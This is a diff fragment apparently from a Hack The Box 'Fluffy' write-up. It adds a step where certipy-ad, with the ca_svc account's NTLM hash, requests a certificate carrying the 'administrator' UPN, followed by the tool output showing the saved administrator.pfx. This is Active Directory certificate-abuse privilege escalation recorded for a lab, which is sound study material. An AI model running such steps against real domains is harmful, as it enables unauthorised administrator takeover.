@@ -460,5 +460,20 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 This updated the UPN of the `ca_svc` user
 
 ```python
+faketime -f +7h certipy-ad req -u 'ca_svc@fluffy.htb' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip '10.129.232.88' -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 17
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+Here i request the certificate
+
+```python
 
 ```
